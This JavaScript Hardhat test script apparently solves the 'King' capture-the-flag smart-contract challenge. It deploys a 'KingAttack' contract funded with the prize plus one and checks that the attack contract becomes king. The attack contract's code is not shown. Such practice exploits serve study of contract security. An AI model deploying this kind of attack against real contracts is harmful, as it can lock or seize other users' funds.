const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const { isTypedArray } = require("util/types");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = "0x0cE3e1D13547c84AbF924C99A187Db112a819858";
describe("King", () => {
  beforeEach(async () => {
    const accounts = await hre.ethers.getSigners();
    deployer = accounts[0];
    hacker = accounts[1];
    const factory = await ethers.getContractFactory("King");
    contract = factory.attach(CHALLENGE_ADDRESS);
  });

  it("initiates hack", async () => {
    console.log("deploying attack contract!");
    const prize = await contract.prize();
    const kingAttackFactory = await ethers.getContractFactory("KingAttack");
    kingAttack = await kingAttackFactory.deploy(contract.address, {
      value: prize.add(1),
      gasLimit: 3e6,
    });
    await kingAttack.deployed();
    expect(await contract._king()).to.eq(kingAttack.address);
    console.log("Hacked!!");
    util.updateTotalSolved(scriptName);
  });
});
